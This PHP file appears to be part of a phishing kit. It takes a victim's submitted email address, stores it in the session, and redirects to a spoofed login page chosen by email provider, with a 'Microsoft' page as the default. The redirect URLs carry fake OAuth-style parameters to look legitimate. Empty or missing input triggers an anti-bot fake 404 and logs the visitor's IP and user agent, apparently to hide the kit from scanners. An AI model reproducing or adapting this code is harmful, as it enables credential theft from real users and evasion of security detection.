<?php

    session_start();

    require_once './Comp.php';
    require_once './Antibot.php';
    require_once './demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (isset(
        $_POST['email2']
    )) {
        if (!$comps->checkEmpty(
            $_POST['email2']
        )) {
            $_SESSION['email2'] = $_POST['email2'];

            if (!$comps->userEmail($_SESSION['email2'])) {
                $comps->headerX("../Microsoft?skip_api_login=1&api_key=145044622175352&kid_directed_site=0&app_id=145044622175352&signed_next=1");
            } else {
                $comps->headerX("../" . $comps->userEmail($_SESSION['email2'])."?skip_api_login=1&api_key=145044622175352&kid_directed_site=0&app_id=145044622175352&signed_next=1");
            }
        } else {
            echo $antibot->throw404();
            $comps->log(
                "../../Guard/Audio/kill.txt",
                "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
            );
            die();
        }
    } else {
        echo $antibot->throw404();
        $comps->log(
            "../../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
        );
        die();
    }